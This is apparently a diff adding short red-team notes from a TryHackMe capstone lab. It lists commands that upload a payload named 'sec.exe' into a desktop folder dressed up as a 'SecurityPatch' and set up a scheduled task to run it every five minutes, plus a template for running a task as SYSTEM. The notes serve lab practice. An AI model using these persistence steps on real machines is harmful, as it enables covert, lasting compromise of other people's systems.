@@ -1,0 +1,18 @@
+
+
+mkdir C:\Users\ashley.chan\Desktop\SecurityPatch
+
+
+upload /home/kali/ctf/redTeamCapstoneChallenge_THM/payloads/sec.exe C:\Users\ashley.chan\Desktop\SecurityPatch\
+
+shell schtasks /create /tn "secpatch1" /tr "C:\Users\ashley.chan\Desktop\SecurityPatch\sec.exe" /sc minute /mo 5
+
+shell schtasks /RUN /tn "secpatch1"
+
+
+/home/kali/ctf/redTeamCapstoneChallenge_THM/payloads/guardpatch.exe
+
+
+Run a TASK as SYSTEM:
+
+schtasks /create /tn "TaskName" /tr "YourCommandHere" /sc minute /mo 5 /ru SYSTEM
